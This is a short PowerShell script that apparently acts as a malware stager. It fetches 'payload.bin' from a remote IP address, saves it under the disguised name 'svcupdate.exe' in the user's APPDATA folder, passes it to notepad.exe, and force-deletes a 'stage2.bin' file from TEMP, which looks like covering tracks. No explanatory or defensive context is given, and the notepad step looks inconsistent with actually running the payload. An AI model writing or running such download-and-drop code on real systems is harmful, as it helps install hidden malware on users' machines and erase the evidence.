$TargetUrl = "http://198.51.100.37/downloads/payload.bin"
$WorkingPath = "$env:APPDATA\svcupdate.exe"
curl.exe -s -L -o $WorkingPath $TargetUrl
Start-Process -FilePath "notepad.exe" -ArgumentList $WorkingPath
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
